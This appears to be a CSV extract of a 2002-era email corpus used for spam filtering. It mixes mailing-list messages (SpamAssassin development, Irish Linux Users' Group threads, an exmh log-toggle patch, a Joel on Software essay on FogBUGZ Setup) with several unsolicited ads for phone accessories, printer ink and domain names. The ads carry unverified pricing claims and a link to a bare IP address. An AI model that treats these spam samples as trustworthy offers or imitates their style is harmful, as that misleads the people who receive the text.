id,subject,email
901,"Subject: Re: [SAtalk] Too funny
","On Wednesday 28 August 2002 16:33 CET Theo Van Dinter wrote:
 > On Wed, Aug 28, 2002 at 04:20:52PM +0200, Malte S. Stretz wrote:
 > > I get about 3 of these per week. A google for trafficmagnet convinces
 > > me that they're worth their own rule...
 >
 > 0 hits here. :(
 
 I recently cleaned my spam corpus from them but these are my current 
 results:
    OVERALL        SPAM     NONSPAM  NAME
      13929         995       12934  (all messages)
         13          13           0  T_TRAFFICMAGNET
 
 I put it into cvs_rules_under_test, let's see what the 2.41 GA run thinks 
 about it :)
 
 Malte
 
 -- 
 -- Coding is art.
 -- 
 
 
 
 
 -------------------------------------------------------
 This sf.net email is sponsored by: Jabber - The world's fastest growing 
 real-time communications platform! Don't just IM. Build it in! 
 http://www.jabber.com/osdn/xim
 _______________________________________________
 Spamassassin-talk mailing list
 Spamassassin-talk@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/spamassassin-talk
 
"
902,"Subject: Re: [ILUG] [OT] GPL & PHP Question
","On Fri, Jul 19, 2002 at 11:47:39PM +0100, Niall O Broin wrote:
 > > I know this is not strictly a 'Linux' issue but any help would be appreciated
 > Microsoft has very much made this a Linux issue - it has attempted to imply
 > that any company using GPL software must make everything it owns public and
 > it must be true - that nice man from Microsoft wouldn't lie, would he ?
 
 but that's just stupid.  microsoft s/w covers a subset of applications
 that are under the gpl.  there are gpl word processors, there's a
 microsoft wp; there are various language compilers and interpreters under
 the gpl, microsoft has their visual compilers.  and so on.  and just
 like the gpl apps, the microsoft apps are distributed under a license.
 that license says lots of things, and there are various licenses used by
 microsoft, but in a nutshell they all pretty much say: you can't copy,
 distribute or modify their s/w; you can't sell it multiple times.
 
 so does anyone think that applies to their wp documents or their visual
 c++ code?
 
 kevin
 
 -- 
 kevin@suberic.net     that a believer is happier than a skeptic is no more to
 fork()'ed on 37058400    the point than the fact that a drunken man is happier
 meatspace place: home       than a sober one. the happiness of credulity is a
 http://ie.suberic.net/~kevin   cheap & dangerous quality -- g.b. shaw
 
 -- 
 Irish Linux Users' Group: ilug@linux.ie
 http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
 List maintainer: listmaster@linux.ie
 
 
"
903,"Subject: Re: [SAdev] Suggestion - 2 levels of Spam Status
","Tony L. Svanstrom wrote:
 
 >On Sun, 15 Sep 2002 the voices made Marc Perkel write:
 >
 >>Right now we have one spam status flag indicating that a message is or
 >>is not spam. The idea being that the end user perhaps make a rule that
 >>would move the spam flagged messages into a spam folder and thus gain
 >>some time by presorting messages into to piles.
 >>
 >
 > If you (people) don't know enough to filter on the actual score they've got
 >the ""stars"", which will give them more than enough levers, if they want it.
 >
 >
 >	/Tony
 >
 Sure - we developers know that - but what I'm talking about is making it 
 easier for END USERS to figure out.
 
 
 
 
 
 -------------------------------------------------------
 This sf.net email is sponsored by:ThinkGeek
 Welcome to geek heaven.
 http://thinkgeek.com/sf
 _______________________________________________
 Spamassassin-devel mailing list
 Spamassassin-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/spamassassin-devel
 
 
"
904,"Subject: ^^^^^Cell Phone Belt Clips $1.95^^^^^^                           18070
","Cellular Phone Accessories All At Below Wholesale Prices!
 
 http://202.101.163.34:81/sites/merchant/sales/
 
 Hands Free Ear Buds 1.99! 
 Phone Holsters 1.98! 
 Booster Antennas Only $0.99
 Phone Cases 1.98! 
 Car Chargers 1.98! 
 Face Plates As Low As 0.99! 
 Lithium Ion Batteries As Low As 6.94! 
 
 http://202.101.163.34:81/sites/merchant/sales/
 
 Click Below For Accessories On All NOKIA, MOTOROLA LG, NEXTEL, 
 SAMSUNG, QUALCOMM, ERICSSON, AUDIOVOX PHONES At Below 
 WHOLESALE PRICES!
 
 http://202.101.163.34:81/sites/merchant/sales/
 
 ***If You Need Assistance Please Call Us (732) 751-1457***
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 To be removed from future mailings please send your remove 
 request to: removemenow68994@btamail.net.cn 
 Thank You and have a super day :)
 
"
905,"Subject: Re: [ILUG] tcpd
","On Sat, Jul 27, 2002 at 11:58:10AM -0700, Paul O'Neil wrote:
 > If I want to use tcpd for ftp and only one user will ever ftp but I dont
 > know what IP that user is because its dialup DHCP how do I setup tcpd for
 > that user?
 
 please don't reply to messages to send a new topic to ilug.  those of
 us using threaded mail clients find that really annoying.
 
 tcpd is host based filtering/auth.  so if the ip is dynamic, you can't
 really use it.  however ftp supports user based auth - actually it kind
 of requires a user, so just set up an account for that person.
 
 kevin
 
 -- 
 kevin@suberic.net     that a believer is happier than a skeptic is no more to
 fork()'ed on 37058400    the point than the fact that a drunken man is happier
 meatspace place: home       than a sober one. the happiness of credulity is a
 http://ie.suberic.net/~kevin   cheap & dangerous quality -- g.b. shaw
 
 -- 
 Irish Linux Users' Group: ilug@linux.ie
 http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
 List maintainer: listmaster@linux.ie
 
 
"
906,"Subject: Patch to enable/disable log
","While I was playing with the past issues, it annoyed me that there was
 no easy way to make the log stop growing (I don't mean to truncate it,
 I mean to just freeze it for a while).
 
 The following patch adds a new button to the log window, which allows
 the log to be switched on/off (the button says ""Disable"" when the
 log is enabled, and the button disables it, and ""Enable"" when the log
 is frozen, and the button enables it again).
 
 kre
 
 --- main.tcl	Wed Aug 21 15:01:48 2002
 +++ /usr/local/lib/exmh-2.5/main.tcl	Wed Aug 28 17:36:59 2002
 @@ -385,6 +385,9 @@
  	ExmhLogCreate
  	wm withdraw $exmh(logTop)
      }
 +    if {! $exmh(logWrite)} {
 +	return
 +    }
      if [info exists exmh(log)] {
  	catch {
  #	    $exmh(log) insert end "" [bw_delta] ""
 @@ -407,6 +410,9 @@
      set exmh(logWindow) 1
      Exwin_Toplevel .log ""Exmh Log"" Log
      set exmh(logTop) .log
 +    set exmh(logDisableBut) \
 +	[Widget_AddBut $exmh(logTop).but swap ""Disable"" ExmhLogToggle]
 +    set exmh(logWrite) 1
      Widget_AddBut $exmh(logTop).but trunc ""Truncate"" ExmhLogTrunc
      Widget_AddBut $exmh(logTop).but save ""Save To File"" ExmhLogSave
      set exmh(logYview) 1
 @@ -457,6 +463,12 @@
      } msg] {
  	Exmh_Status ""Cannot save log: $msg"" error
      }
 +}
 +proc ExmhLogToggle {} {
 +    global exmh
 +
 +    set exmh(logWrite) [expr ! $exmh(logWrite)]
 +    $exmh(logDisableBut) configure -text [lindex {""Enable "" Disable} $exmh(logWrite)]
  }
  #### Misc
  
 
 
 
 
 _______________________________________________
 Exmh-workers mailing list
 Exmh-workers@redhat.com
 https://listman.redhat.com/mailman/listinfo/exmh-workers
 
"
907,"Subject: zzzz,Hello
","Are you tired of spending a fortune on printer cartridges?  
                                                                                                                          
 Are you tired of making a mess trying to refill your old cartridges?
                                                                                                                       
 Then here's your answer......
                                                                                                                           
 PRINTER CARTRIDGES FOR UP TO 50% OFF STORE PRICES
 
 The average person spends over $150 on new cartridges per year.....
 
 DON'T BE ONE OF THEM...EMAIL TODAY!
 
 
 PLEASE DO NOT USE THE REPLY BUTTON
 
 CLICK HERE:    printerink1@cbphost.net
 
 Just include your printer or cartridge type, and we will email you back 
 the price, its that simple.  THIS WILL SAVE YOU LOTS OF MONEY!!  Be 
 sure to ask about our referral discount for passing the savings on to a 
 friend.  
 
 
 If we don't save you $$, you have lost nothing!    In addition, just 
 reply with your printer type, and be automatically entered in our 
 monthly $50 gift certificate drawing.
 
 
 
 We just wanted to save you some money, but to unsubscribe to this 
 mailing email here:  printerink2@cbphost.net   and just type 'REMOVE' in 
 the subject line
 
 
"
908,"Subject: Re: [SAtalk] German spam corpus / foreign language spam
","
 On Thursday, August 22, 2002, at 09:36  AM, Justin Mason wrote:
 
 >
 > ""Craig R.Hughes"" said:
 >
 >> I thought we'd sort of decided that after 2.40 we'd switch the
 >> meaning of the ""lang"" prefix to actually mean ""run these rules
 >> if language matches"", where ""language"" is what TextCat spits out
 >> for a message, as opposed to using the locale which is how
 >> things currently work.
 >
 > ah, right -- I'd forgotten that.  :(
 >
 > doesn't help with the finding-broken-rules QA case though...
 
 It does, if you have a corpus of german spam and nonspam to feed 
 it, and you're not in a de locale.
 
 C
 
 
 
 -------------------------------------------------------
 This sf.net email is sponsored by: OSDN - Tired of that same old
 cell phone?  Get a new here for FREE!
 https://www.inphonic.com/r.asp?r=sourceforge1&refcode1=vs3390
 _______________________________________________
 Spamassassin-talk mailing list
 Spamassassin-talk@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/spamassassin-talk
 
"
909,"Subject: Feedback from my posting about FogBUGZ Setup fell into four
","URL: http://www.joelonsoftware.com/news/20021008.html
 Date: Not supplied
 
 Feedback from my posting[1] about FogBUGZ[2] Setup fell into four categories. 
 
 *""Why make Setup reversable? Instead you should collect all the information 
 from the user and make all the changes in one batch at the end.""* There are a 
 couple of things to understand here. First of all, even if you do everything in 
 one batch at the end, there's always a possibility that some step in the middle 
 of the batch will fail, and in that case, a well-behaved setup program will 
 back out the steps that were already done. There are well over 100 error 
 messages in the string table for FogBUGZ Setup so the number of things that can 
 fail is not insignificant. 
 
 Second, it's not nice to tell people about an error in their input three pages 
 after they made the mistake. For example, early in the FogBUGZ setup process we 
 prompt you to create an account for FogBUGZ to use: 
 
 [IMG: http://www.joelonsoftware.com/pictures/setupNewAcct.gif (FogBUGZ Setup 
 Screenshot)] 
 
 The account creation could fail for a myriad of reasons, none of which can be 
 predicted before trying to create the account. For example, the password might 
 not conform to the system password policy. And different national versions of 
 Windows NT have different rules about accented letters in passwords (betcha 
 didn't know that!). It's better to tell the user about this problem right away 
 so they can correct their input rather than having a message come up during the 
 long install process later, forcing the user to back up and fix it. And even if 
 you force the user to back up and fix it, you still have to undo the first part 
 of the work that you did before creating the account, otherwise you've left 
 their system in an indeterminate state. 
 
 In any case I need to write code to create the account and delete the account 
 in case something later fails; I might as well call that code on this page of 
 the wizard where I can display a useful error message. 
 
 And what are the kinds of things that need to be reversable? Well, in order to 
 upgrade FogBUGZ without requiring a reboot (and we _never, ever _require a 
 reboot), we have to shut down a couple of processes that might have been 
 keeping FogBUGZ files pinned down, such as IIS (Microsoft's web server). So 
 part one of the batch is ""Stop IIS."" Now if part 2 fails for some reason, it 
 would be _extremely_ rude to leave IIS not running. And anyway, it's not like I 
 don't need to write the code for ""Start IIS"" for the end of the batch. So the 
 code to rollback ""Stop IIS"" is already written. No big deal, I just need to 
 call it at the right place. 
 
 I think one reason that people think you should ""gather all the info and then 
 do all the work"" is because with very large installation programs that are very 
 slow, this is a polite way to waste less of the user's time. Indeed even 
 FogBUGZ setup does 95% of its work at the very end. But the ""create account"" 
 operation is so fast, that principle simply doesn't apply here. Even our 95% of 
 the work phase takes well under a minute, most of which is spent waiting for 
 IIS to stop and start. 
 
 *""Why did you use VC++/MFC? Surely an advanced intelligence such as yourself 
 has admitted by now that Delphi[3] is more productive.""* First of all, leave 
 your language religious fanaticism at the Usenet door. Somehow I managed 
 to figure out_ in high school_ that language advocacy and religious 
 arguments are unbelievably boring.  
 
 Secondly, even if Delphi were more productive, the only pertinent question, 
 since I am writing the code, is _what is more productive for Joel Spolsky_. And 
 I don't know Delphi at all, but I know Win32, MFC, and VC++ _really, really 
 well_. So while I might not outcode a good Delphi programmer, I would 
 definitely outcode a completely inexperienced Delphi programmer (which is me), 
 certainly over a short 4 week project. Third, many of the things I needed to do 
 in this setup program are things like ""grant the Logon as Service privilege to 
 an account."" This is rare enough that the only way to find out how to do this 
 is to search the Microsoft knowlege base and the web in general. When you 
 search the web in general for how to do fancy things with Windows NT, what you 
 find is about 75% C code, maybe 20% VB code, and 5% everything else. Yes, I 
 know, I could translate the C code into Delphi (assuming I was a sophisticated 
 Delphi programmer, not a completely inexperienced Delphi programmer), but that 
 costs as much productivity as I would supposedly gain from your supposedly more 
 productive programming language. And fourth, I already had about 30% of the 
 code I needed for Setup in MFC format: from FogBUGZ 2.0 Setup, and a library 
 I've been using for years to make wizards. 
 
 *""Why make Setup at all? You already have your customers' money. Good Setup 
 programs don't increase sales.""* This was actually the smartest question and 
 made me think the hardest. I came up with three reasons: 
 
 - Decreased tech support cost. This setup program will pay for itself over the 
 life of the code. 
 - Delight my customers. When I'm trying to get them to upgrade to 4.0, I want 
 them to remember how painless the 3.0 installation was, so they won't hesitate 
 because they are afraid to upgrade. I'm still using an old version of 
 SpamAssassin that is becoming increasingly ineffective, even though I know the 
 new version is much better, because I just can't bear the thought of another 
 morning wasted. The very memory of the first SpamAssassin installation -- all 
 the little SSH windows, some su'ed, trying to scroll through man pages and 
 Google Groups, accidentally hitting Ctrl+Z in Emacs to undo and having it 
 suspend, trying to guess why we can't get the MTA to run procmail, sorry it's 
 too much. If SpamAssassin was making money off of upgraders they would have 
 lost my business because they don't have a SETUP program. 
 - Win reviews. Software reviewers always cast about for some kind of 
 standardized way to rate software, even when they are comparing apples and 
 oranges and planets and 17th century philosophers. They always have a 
 meaningless list of things to review which can be applied to PC games, 
 mainframe databases, web site auction software, and DNA sequencing 
 software. And Setup is always on their list. A single flaw in setup is 
 guaranteed to be mentioned in every review because every reviewer will see it 
 and say ""Aha!""
 
 
 *""How can we make WISE[4] better?"" *Kudos to the product manager of WISE 
 Installation System for calling me up and listening to my litany of all the 
 reasons his product wasn't adequate for typical IIS/ASP/SQL applications.
 
 [1] http://www.joelonsoftware.com/news/20021002.html
 [2] http://www.fogcreek.com/FogBUGZ
 [3] http://discuss.fogcreek.com/delphiquestions
 [4] http://www.wise.com
 
 
"
910,"Subject: Re: gentoo 0.11.28 is out..
","Once upon a time, Matthias wrote :
 
 > On Thu, 18 Jul 2002 13:00:29 +0200
 > Matthias Saou <matthias@egwn.net> wrote:
 > 
 > > Once upon a time, Matthias wrote :
 > > > ..see subject.
 > > ..see valhalla.freshrpms.net ;-)
 > 
 > Hi, Matthias,
 > 
 > You should temporarly remove gentoo 0.11.29 from valhalla.freshrpms.net.
 > This build (and 0.11.28) has a strong bug: Problems with copying ""deep""
 > directories.
 > 
 > Have reported this to Emil, he looks currently into it, a fix should be
 > available soon..
 > 
 > Sorry
 
 Done.
 Well, I feel especially sorry for him since he already qualified 0.11.28 of
 ""brown paper bag"" release because of the column header clicking bug :-((
 
 I'll put up the next version as soon as it's out hoping it'll fix all
 current issues!
 
 Matthias
 
 -- 
 Matthias Saou                                World Trade Center
 -------------                                Edificio Norte 4 Planta
 System and Network Engineer                  08039 Barcelona, Spain
 Electronic Group Interactive                 Phone : +34 936 00 23 23
 
 _______________________________________________
 RPM-List mailing list <RPM-List@freshrpms.net>
 http://lists.freshrpms.net/mailman/listinfo/rpm-list
 
 
"
911,"Subject: Re: [ILUG] How to copy some files
","On Fri, Jul 19, 2002 at 05:06:59PM +0100, Matthew French wrote:
 
 > On that note: is there any real benefit to using hard links? I avoid them as
 > a rule, and cannot think of any good reason to use them at the moment.
 
 There are lots of benefits to using hard links, for all sorts of reasons. In
 this case, they are being used to provide two quite different namespaces
 for the same set of files.
 
 
 Niall
 
 -- 
 Irish Linux Users' Group: ilug@linux.ie
 http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
 List maintainer: listmaster@linux.ie
 
 
"
912,"Subject: new extensions now only $14.95
","PUBLIC ANNOUNCEMENT:
 
 The new domain names are finally available to the general public at discount prices. Now you can register one of the exciting new .BIZ or .INFO domain names, as well as the original .COM and .NET names for just $14.95. These brand new domain extensions were recently approved by ICANN and have the same rights as the original .COM and .NET domain names. The biggest benefit is of-course that the .BIZ and .INFO domain names are currently more available. i.e. it will be much easier to register an attractive and easy-to-remember domain name for the same price.  Visit: http://www.affordable-domains.com today for more info.
  
 Register your domain name today for just $14.95 at: http://www.affordable-domains.com. Registration fees include full access to an easy-to-use control panel to manage your domain name in the future.
  
 Sincerely,
  
 Domain Administrator
 Affordable Domains
 
 
 To remove your email address from further promotional mailings from this company, click here:
 http://www.centralremovalservice.com/cgi-bin/domain-remove.cgi
 07
 
 
 5027ReYo8-086zKcv4695tdvr3-511Ilir9233WYsO9-473Auor9338JQXz2-3l58
 
"
913,"Subject: [use Perl] Headlines for 2002-09-11
","use Perl Daily Headline Mailer
 
 DynDNS.org Offers Free DNS To Perl Sites
     posted by KM on Tuesday September 10, @08:23 (news)
     http://use.perl.org/article.pl?sid=02/09/10/1225228
 
 
 
 
 Copyright 1997-2002 pudge.  All rights reserved.
 
 
 ======================================================================
 
 You have received this message because you subscribed to it
 on use Perl.  To stop receiving this and other
 messages from use Perl, or to add more messages
 or change your preferences, please go to your user page.
 
 	http://use.perl.org/my/messages/
 
 You can log in and change your preferences from there.
 
 
"
